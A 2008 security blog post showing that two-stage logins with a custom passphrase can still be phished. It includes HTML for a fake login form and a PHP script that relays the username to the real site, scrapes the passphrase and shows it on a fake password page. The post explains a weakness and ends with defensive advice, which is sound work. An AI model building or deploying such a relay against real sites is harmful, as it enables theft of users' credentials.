---
title: How custom passphrases/pictures still don't protect against phishing
date: 2008-11-20
tags:
- security
---
As you probably remember, I have lots of interest in phishing techniques (I talked about one [here](/blog/2007/07/11/the-anatomy-of-a-phishing-attack-advanced-technique/), and preventing them [here](/blog/2007/07/11/the-top-17-ways-to-help-eliminate-the-phishing-threat/)).  I've noticed a new trend: a dual stage login form with a custom picture or passphrase.  Users are to gain trust in the login page because their custom configured option is displayed.  The more I started thinking about this, however, I kept seeing an issue - this still can be easily phished!  I'm going to demonstrate a method of phishing the passphrase version.  I don't want to do a picture example because it a) takes more code and b) more people have moved to that thinking it is more secure.  Lets go:

<!--more-->

First off, all phishing starts with getting the user to a login page not at the respected domain.  So, lets just skip that step, and examine our login page.  This will be a duplicate of our real site's login page - note the reminder that they will have to verify their passphrase.

**`login.php`** @ fakedomain.com
```html
<form action="login2.php" method="post">
  <label>Username: <input name="username"></input><br></br>
  <em>Remember, you will be asked to verify your passphrase on the next page.</em>
  <br></br>
  <input type="submit" value="Login"></input>
</form>
```

Very simple login which sends it to another page - hopefully named the same as the real domain's login page.

Lets look at the page we'll be submitting to:

**`login2.php`** @ fakedomain.com
```php    
/** cutting out a lot of code - make sure its not empty, etc **/
$args = array ('username'=>$_POST['username']);
$uri = 'http://realdomain.com/login.do.php';
$opts = array(
  'http' => array(
    'method' => 'POST', 
    'header' => 'Content-Type: application/x-www-form-urlencoded', 
    'content' => http_build_query($args)
  )
);
$context = stream_context_create($opts);
$page_with_phrase = file_get_contents($uri, false, $context);

$doc = new DomDocument();
$doc->loadHTML($page_with_phrase );

$passphrase = $doc->getElementById('passphrase_node')->nodeValue;

// next login form page actually shows the 
// $passphrase phrase and asks for password
include('next_login_form.php');
```

Ok, first off, you'll see we create a nice post with our stream context creation ([detailed here](/blog/2008/11/14/posting-requests-in-php-without-curl/)) - so we basically send the username to the real domain as they had logged in.  (Depending on the target site, you might also have to send referrers, cookies, etc - but we're making it a really simple example here.)

We retrieve the page after a successful post of the username.  This content should now contain the custom passphrase somewhere.  For our example, there is a nicely named `div` or `span` with an id of `passphrase_node`.  Probably, in real life, you'd have to use a complex XPath to get the actual value.

From then on, we just include our 'second' login page which shows the passphrase, and then requests the password from the user.  From there, you can do whatever you want.

**Ok so...**
Its nice to see that people are trying to eliminate phishing - but there still is only one real solution IMHO - and that is to educate users on the address bar (or get them to install a plugin that validates the page they're on.).
